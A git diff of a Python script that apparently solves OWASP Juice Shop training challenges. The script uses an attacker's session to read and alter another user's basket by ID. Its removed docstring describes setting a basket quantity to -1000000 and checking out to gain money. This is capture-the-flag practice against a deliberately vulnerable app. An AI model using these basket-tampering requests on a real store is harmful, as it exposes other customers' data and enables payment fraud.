@@ -1,25 +1,9 @@
 """
 This file is used to solve the OWASP Juice-shop Task
 VIEW BASKET
-MANIPULATE BASKET
+# MANIPULATE BASKET   ----> Not solved
 GOAL: to view or manipulate on other people's basket
-METHODOLOGY:
-step1. login using user A's cookies and headers
-    Hint: we can use the user created in repetitive registration
-step2. ....
----------------------------------------------------------------
-This file is used to solve the OWASP Juice-shop Task
-PAYBACK TIME
-Category: Improper Input Validation
-GOAL: set the amount of sth in your basket to be negative
-      after this you can checkout and gain money
-METHODOLOGY:
-step1. login using user A's cookies and headers
-    Hint: we can use the user created in repetitive registration
-step2. Set the quantity of sth in your basket to be -1000000
-setp3. Set address and checkout
 """
-import json
 
 from plugins import attack as a
 from plugins import login as usrLogin
@@ -27,18 +11,16 @@ import urllib3
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 import random
 
-from urllib import parse
-
 class manipulate_basket(a.attack_inter):
     def __init__(self):
         self.juice_session = a.requests.session()
-        #usr = usrLogin.test_user_login_class()
-        #res, self.cookie, self.header = usr.first_login()
-        self.email = 'test66@gmail.com'
-        self.cookie, self.header = a.auth_load(self.email)
-        self.basketId = a.bid_load(self.email)
-        self.victimEmail = 'test334@gmail.com'
-        self.victimBid = a.bid_load(self.victimEmail)
+
+    def set_info(self, email, victimEmail):
+        self.email = email
+        self.victimEmail = victimEmail
+        self.basketId = a.get_basket_id(self.email)
+        self.victimBid = a.get_basket_id(self.victimEmail)
+        self.cookie, self.header = a.get_auth(self.email)
 
     def view_basket(self, basektId):
         print('-----------------------------------------------------')
@@ -47,7 +29,7 @@ class manipulate_basket(a.attack_inter):
             productIds = []
             url = a.URL + '/rest/basket/' + str(basektId)
             response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
-            # print(response.text)
+            print(response.text)
             products = response.json()["data"]["Products"]
             for i in range( len(products) ):
                 item = products[i]
@@ -70,38 +52,25 @@ class manipulate_basket(a.attack_inter):
             count += 1
         return pId
 
-    def addto_basket(self,quantity):
+    def addto_basket(self, quantity):
         print('---------------------------------------------------')
-        #print("Let us add to basket ID {} ----------------".format(self.victimBid))
+        print("Let us add to basket ID {} ----------------".format(self.basketId))
         try:
             productId = self.generate_productID(self.basketId)
             print("we will add product Id {} ".format(productId))
-            # data = [('contract','lalala'),('contract','lololo')]
-            # data_byte = parse.urlencode(data).encode("utf-8")
-            # print(data_byte)
             json = {
-                "ProductId": 1,
-                #"BasketId": '|'.join([self.basketId, self.victimBid]),
+                "ProductId": productId,
                 "BasketId": self.basketId,
-                # "BasketId": self.victimBid,
-                "quantity": 1
+                #"BasketId": "15",
+                "quantity": quantity
             }
-            # data = {
-            #     "BasketId": self.victimBid
-            # }
-
             url =a.URL + '/api/BasketItems/'
-            response = self.juice_session.post(url, cookies=self.cookie, headers=self.header,json = json, verify= False)
-
-            print(response.status_code)
-            #self.view_basket(self.victimBid)
+            response = self.juice_session.post(url, cookies=self.cookie, headers=self.header, json = json
+                                               , verify= False)
+            print(response.text)
+            self.view_basket(self.basketId)
         except:
             print("2")
-
-
-
-    def manipulate_basket(self):
-        pass
 
     def generator(self):
         pass
@@ -112,12 +81,16 @@ class manipulate_basket(a.attack_inter):
         logger = a.logging.getLogger("Manipulate Basket")
         a.logging.info(logger)
         a.logging.info('Started')
-        #print("bein")
-        #self.view_basket(self.basketId)
-        print("hello")
-        self.addto_basket(1)
-        #self.view_basket("2")
+
+        print("please enter attacker's email")
+        email = input()
+        print("please enter victim's email")
+        victim_email = input()
+        self.set_info(email=email, victimEmail=victim_email)
+        self.view_basket(self.victimBid)
+        self.addto_basket(quantity=1)
         a.logging.info('Finished')
+
 
 
 
